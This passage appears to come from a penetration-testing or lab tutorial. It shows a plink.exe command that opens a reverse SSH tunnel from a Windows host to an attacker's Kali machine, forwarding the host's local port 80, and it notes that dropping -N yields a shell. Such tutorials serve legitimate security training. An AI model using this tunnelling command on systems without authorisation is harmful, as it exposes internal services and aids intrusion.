```
For example, let’s assume:
My IP: 10.10.14.4
My Username: root
My Password: toor
My Port: 8075 (this can be any available port you choose, I just selected 8075.

Then we need the following command:
plink.exe -ssh -l root -pw toor -N -R 10.10.14.4:8075:127.0.0.1:80 10.10.14.4
```

### Note

When you run the ssh command for first time, you will be prompted to store key in cache or not. Then this key will be stored under “HKEY\_CURRENT\_USER\\Software\\SimonTatham\\PuTTY\\SshHostKeys” for future connections and you will have trust established to the Kali machine. You will not be asked again until you remove this key from registry.

We included -N option to tell plink that we don’t want to have shell started. If you want a shell after the tunnel is established, remove -N option.
